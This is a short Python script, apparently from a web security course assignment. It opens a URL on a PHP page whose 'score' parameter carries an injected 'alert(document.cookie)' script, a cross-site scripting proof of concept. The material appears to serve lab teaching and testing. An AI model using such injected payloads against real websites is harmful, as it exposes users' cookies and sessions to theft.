import webbrowser
chromium_path = "/usr/bin/chromium-browser"
new = 2
webbrowser.get(chromium_path).open("http://www.wsb.com/Assignment2/case05.php?score=6%3Balert(document.cookie)", new)
